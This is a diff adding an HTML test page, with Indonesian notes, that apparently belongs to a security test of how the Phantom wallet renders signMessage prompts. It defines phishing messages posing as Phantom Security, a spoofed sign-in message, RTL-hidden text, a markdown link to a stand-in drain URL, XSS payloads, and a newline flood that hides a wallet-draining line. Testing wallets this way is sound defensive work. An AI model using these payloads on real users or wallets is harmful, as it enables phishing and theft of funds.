@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Phantom Security Verification</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 720px; margin: 0 auto; padding: 16px; background:#0d0d10; color:#e6e6e6; line-height:1.5; }
+    h1 { color:#a78bfa; font-size:20px; }
+    h2 { color:#f0abfc; font-size:15px; margin-top:18px; }
+    button { display:block; width:100%; padding:14px; background:#7c3aed; color:white; border:none; border-radius:8px; font-size:14px; margin: 6px 0; text-align:left; }
+    button.alt { background:#1f1f25; border:1px solid #2f2f37; color:#a5f3fc; }
+    .warn { background:#3f1d1d; border:1px solid #ef4444; padding:10px; border-radius:6px; color:#fecaca; font-size:13px; }
+    pre#log { background:#0a0a0c;border:1px solid #2f2f37;padding:10px;border-radius:6px;font-size:12px;color:#86efac;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow:auto }
+    .desc { font-size:12px; color:#9ca3af; margin: 2px 0 8px 4px; }
+  </style>
+</head>
+<body>
+  <h1>A2 — signMessage Payload Spoofing</h1>
+  <div class="warn"><b>JANGAN APPROVE</b>. Cuma observe bagaimana Phantom render isi message di prompt sign.</div>
+
+  <button id="connect" class="alt">0) Connect (jalankan dari Phantom in-app browser)</button>
+
+  <h2>Skenario test (klik → trigger signMessage)</h2>
+
+  <button data-id="phishing_official">1) Pesan menyaru sebagai Phantom Official</button>
+  <div class="desc">"Phantom Security Verification — verify your wallet by signing this message…"</div>
+
+  <button data-id="fake_login">2) Pesan login looking sangat mirip dengan SIWS standard</button>
+  <div class="desc">SIWS-style message tapi domain berbeda dari yang menampilkan</div>
+
+  <button data-id="hidden_action">3) Hidden action via Unicode RTL/zero-width</button>
+  <div class="desc">Display: "I confirm reading TOS" → hidden teks yang berlawanan</div>
+
+  <button data-id="markdown">4) Markdown / link injection</button>
+  <div class="desc">Test apakah Phantom render markdown atau link clickable</div>
+
+  <button data-id="html">5) HTML/JS injection di message</button>
+  <div class="desc">&lt;script&gt;, &lt;img onerror&gt;, dll — XSS test pada prompt sign</div>
+
+  <button data-id="newline_bomb">6) Newline overflow — pesan ribuan newline</button>
+  <div class="desc">Bisa push approve button keluar viewport?</div>
+
+  <button data-id="long">7) Pesan 50000 karakter</button>
+
+  <button data-id="binary">8) Binary payload (non-UTF8)</button>
+  <div class="desc">Random bytes — Phantom show garbage atau crash?</div>
+
+  <button data-id="empty">9) Pesan kosong</button>
+
+  <button data-id="control">10) Control characters (BEL, BS, ESC sequences)</button>
+
+  <h2>Status</h2>
+  <pre id="log"></pre>
+
+  <script>
+  const payloads = {
+    phishing_official:
+      "═══════════════════════════════════\n" +
+      "  PHANTOM SECURITY — VERIFICATION  \n" +
+      "═══════════════════════════════════\n\n" +
+      "Sign this message to verify your wallet ownership.\n" +
+      "This is required by Phantom on 2026-05-04.\n\n" +
+      "✅ Verified by Phantom Security Team\n" +
+      "✅ Signing this is SAFE — no transaction is sent\n" +
+      "✅ Domain: phantom.app",
+
+    fake_login:
+      "phantom.app wants you to sign in with your Solana account:\n" +
+      "${ADDRESS}\n\n" +
+      "Welcome to Phantom — please sign to continue.\n\n" +
+      "URI: https://phantom.app/login\n" +
+      "Version: 1\n" +
+      "Chain ID: solana:mainnet\n" +
+      "Nonce: 12345678\n" +
+      "Issued At: 2026-05-04T12:00:00Z",
+
+    hidden_action:
+      "I confirm I have read and agree to ‮.tnuocca-yruusaert-yntpme-ot-egasil-rebmem-vord-ot-meinrep-ynevg-eraevh I‭ Terms of Service.",
+
+    markdown:
+      "# Phantom Verification\n\n" +
+      "[Click here to verify](https://phantom-verify.example.com/drain)\n\n" +
+      "**This is safe** — *signed by Phantom team*.\n\n" +
+      "`code` — _italic_ — ~~strike~~",
+
+    html:
+      "<script>alert('XSS in sign prompt')<\/script>" +
+      "<img src=x onerror=\"alert('XSS2')\">" +
+      "<a href='https://evil.example.com'>Phantom Official Link</a>" +
+      "<iframe src='javascript:alert(1)'></iframe>",
+
+    newline_bomb:
+      "Approve to receive your airdrop.\n" + "\n".repeat(2000) +
+      "Hidden small print: this signature drains your wallet.",
+
+    long: "A".repeat(50000),
+
+    binary: null, // built dynamically as Uint8Array
+    empty: "",
+
+    control:
+      "Test\x07\x08\x1b[31mRED\x1b[0m\x1b[2J\x1b[H\x00\x00\x00END",
+  };
+
+  function log(msg) {
+    const el = document.getElementById('log');
+    el.textContent = "[" + new Date().toISOString().slice(11,19) + "] " + msg + "\n" + el.textContent;
+  }
+
+  document.getElementById('connect').onclick = async () => {
+    const p = window.phantom?.solana;
+    if (!p) { log("ERR: open via Phantom in-app browser. Pakai 'phantom.app/ul/browse/...' "); return; }
+    try {
+      const res = await p.connect();
+      log("connected " + res.publicKey.toString());
+    } catch (e) { log("connect err: " + (e?.message||e)); }
+  };
+
+  document.querySelectorAll('button[data-id]').forEach(btn => {
+    btn.onclick = async () => {
+      const id = btn.dataset.id;
+      const p = window.phantom?.solana;
+      if (!p) { log("ERR: open via Phantom in-app browser"); return; }
+      if (!p.publicKey) { log("Connect dulu (button 0)"); return; }
+
+      let msg;
+      if (id === 'binary') {
+        msg = new Uint8Array(256);
+        for (let i = 0; i < 256; i++) msg[i] = i;
+      } else {
+        let text = payloads[id];
+        if (id === 'fake_login') text = text.replace('${ADDRESS}', p.publicKey.toString());
+        msg = new TextEncoder().encode(text);
+      }
+
+      log("→ signMessage [" + id + "] (" + msg.length + " bytes)");
+      try {
+        const res = await p.signMessage(msg, "utf8");
+        log("!!! SIGNED — should have rejected (sig=" + res.signature?.slice(0,8) + "…)");
+      } catch (e) {
+        log("rejected: " + (e?.message || e));
+      }
+    };
+  });
+
+  log("provider=" + (window.phantom?.solana ? "ok" : "MISSING — open in Phantom in-app browser"));
+  </script>
+</body>
+</html>
